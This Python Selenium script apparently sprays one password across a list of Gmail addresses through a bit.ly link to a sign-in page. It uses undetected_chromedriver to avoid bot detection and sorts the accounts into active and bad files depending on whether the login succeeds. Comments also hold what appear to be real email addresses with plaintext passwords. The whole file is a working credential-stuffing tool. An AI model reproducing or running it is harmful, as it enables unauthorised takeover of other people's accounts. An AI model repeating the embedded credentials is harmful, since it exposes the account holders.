#666666
import os
import time
from selenium.webdriver.common.by import By
import undetected_chromedriver as uc
#from PyQt5 import QtWidgets, uic
#from PyQt5.QtWidgets import *
#from PyQt5.QtGui import QPixmap,QIcon
#from PyQt5.QtCore import Qt
#import sys
#from threading import Thread
import time
class App:
    def __init__(self):
        pass
        self.emails = []
        self.num_email = 0
        self.passwords = []
        self.password = ""
        self.dc = {}
        self.get_email_and_pass(0)
        self.get_password_in_file()
        self.len_email()
        ##########################
        #kahhinh268@gmail.com
        #Aa963258
        ##
        #nathan67lewis85@gmail.com
        #Ayoub2023
        #self.email = "nathan67lewis85@gmail.com"
        #self.passwd = "Ayoub2023"

        
        ###############
        self.open_br()
        self.run()
        print(f"Tootl Email Num ({str(self.num_email)})")

    def run(self):
        print("*"*40)
        for i in range(self.num_email):
            self.get_email_and_pass(i)
            self.login(self.emails[i],self.password)
            print(f"Account Num ({i}) from ({str(self.num_email)})")
            print("*"*40)
            #print(self.emails[i])
            #print(self.password)
            

    

    def login(self,email,passwd):
        self.url = "https://bit.ly/3t1G6fz"
        self.driver.get(self.url)
        #email
        time.sleep(5)
        self.driver.find_element(By.ID, "identifierId").send_keys(email)
        #next
        time.sleep(5)
        try:
            self.driver.find_element(By.XPATH, "//span[text()='Next']").click()
            

        except:
            pass
        try:
            self.driver.find_element(By.XPATH, "//span[text()='التالي']").click()
            
        except:
            pass

        
    
        #####################


        
        ##############################################################
        #password
        time.sleep(4)
        try:
            self.driver.find_element(By.NAME, "password").send_keys(passwd)
            
        except Exception as e:
            pass
        try:
            self.driver.find_element(By.NAME, "Passwd").send_keys(passwd)
            
        except Exception as e:
            pass
        #############
        try:
            self.driver.find_element(By.XPATH, "//span[text()='Next']").click()
            
        except:
            pass
        try:
            self.driver.find_element(By.XPATH, "//span[text()='التالي']").click()
            

            
        except:
            pass
        
        time.sleep(4)
        self.driver.refresh()
        time.sleep(5)
        page_text = self.driver.page_source


        


        ############################################
        

        #"يمكنك إدارة المعلومات والخصوصية والأمان للاستفادة من"
        #"لم يتمّ العثور على حسابك على Google."
        if "يمكنك إدارة المعلومات والخصوصية والأمان للاستفادة من" in page_text:
            print("موجود مرحباً حساب نشط")
            ############
            #التاكد اذا كان الحساب موجود 
            with open('Active_accounts.txt', 'r') as file:
                if email in file.read():
                    print(f"fuond in file: {email}")
                    #print('نعم، النص موجود في الملف.')
                    #print(f"found: {email}")

                    pass

                else:
                    self.create_file_accounts_active(email)
                    print(f"Add Accounts Active: {email}")
                    page_text = ""
                    time.sleep(3)
                
            

            #تسجيل الخروج
            #"""
            try:
                #self.driver.execute_script("document.getElementById('h-recaptcha-response').style = 'width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px;';")
                #print("Done i'm not reboot")
                #self.driver.find_element(By.CSS_SELECTOR, ".gb_b .gb_d").click()
                self.driver.get("https://accounts.google.com/Logout?ec=GAdAwAE&hl=ar")
                #CSS_SELECTOR
            except:
                pass
            #"""

        else:
            #التاكد اذا كان الحساب موجود 
            with open('Bad_active.txt', 'r') as file:
                if email in file.read():
                    #print('نعم، النص موجود في الملف.')
                    print(f"bad fuond in file: {email}")
                    pass
                else:
                    #self.create_file_accounts_active(email)
                    self.create_file_accounts_bad_active(email)
                    print(f"bad: {email}")
                    page_text = ""
                    self.driver.get(self.url)
                    

        ###########################################
    def create_file_accounts_active(self,email):
        filename = "Active_accounts.txt"
        if not os.path.exists(filename):
            with open(filename, 'w',encoding='utf-8') as file:
                file.write(email + "\n")
                #file.write(password + "\n")
            file.close()
        else:
            with open(filename, 'a',encoding='utf-8') as f:
                f.write("\n" + email)
                f.close()
            
    def create_file_accounts_bad_active(self,email):
        filename = "Bad_active.txt"
        if not os.path.exists(filename):
            with open(filename, 'w',encoding='utf-8') as file:
                file.write(email + "\n")
                #file.write(password + "\n")
            file.close()
        else:
            with open(filename, 'a',encoding='utf-8') as f:
                f.write("\n" + email)
                f.close()
    def get_password_in_file(self):
        filename = 'password.txt'
        if not os.path.exists(filename):
            with open('password.txt', 'w') as f:
                f.write("12345678")
     

            with open('password.txt', 'r') as r:
                first_line = r.readline()
                self.password = first_line.replace(" ","")
                

        else:
            with open('password.txt', 'r') as f:
                first_line = f.readline()
                self.password = first_line.replace(" ","")
                
                
        return first_line
        

    def get_email_and_pass(self,num_email):
        #محاوله انشاء ملف جديد
        filename = 'Email.txt'
        if not os.path.exists(filename):
            with open(filename, 'w') as file:
                file.write('name@gmail.com 12345678')
                print(f'The file {filename} was created successfully.')
        else:
            #print(f'The file {filename} already exists.')
            pass
        ###############################################################
        with open('Email.txt', 'r') as file:
            # Read lines from the file
            lines = file.readlines()
            # Print each line
            # قوائم لتخزين البريد الإلكتروني وكلمات المرور
        
        
        # فصل البريد الإلكتروني وكلمات المرور

        for line in lines:
            if len(line.strip().split()) >= 1:
                email = line.strip()  # قم بتغيير الفاصل إذا كان يستخدم حرفاً آخر
                
                self.emails.append(email.replace(" ",""))
                self.passwords.append(self.password)
                
                

            else:
                #print(f"خطأ في السطر: {line.strip()}")
                pass

    def open_br(self):
        self.options = uc.ChromeOptions()
        self.options.headless = False
                # stop msg
        #options.add_argument("argument")
        #prefs = {"credentials_enable_service": False,
                #"profile.password_manager_enabled": False,
                #"profile.default_content_setting_values.notifications" : 2}
        #options.add_experimental_option("prefs",prefs)
        self.driver = uc.Chrome(options = self.options)

    def len_email(self):
        try:
            with open('Email.txt', 'r') as f:
                lines = f.readlines()
            self.num_email = int(len(lines))
        except Exception as e:
            print("Erorr fun > len_email")
        

x = App()


#print("password:",x.password)



"""
self.driver.find_element(By.CLASS_NAME, "email").send_keys(str(emails[0]))
        self.driver.find_element(By.CLASS_NAME, "password").send_keys(str(passwords[0]))
        self.driver.find_element(By.NAME, "login_button").click()

class App:
    def __init__(self) -> None:
        self.options = uc.ChromeOptions()
        self.options.headless = False
        # stop msg
        self.options.add_argument("argument")
        prefs = {"credentials_enable_service": False,
            "profile.password_manager_enabled": False,
            "profile.default_content_setting_values.notifications" : 2}
        self.options.add_experimental_option("prefs",prefs)
        self.driver = uc.Chrome(options = self.options)
        self.driver.get(url)
        ###########
"""
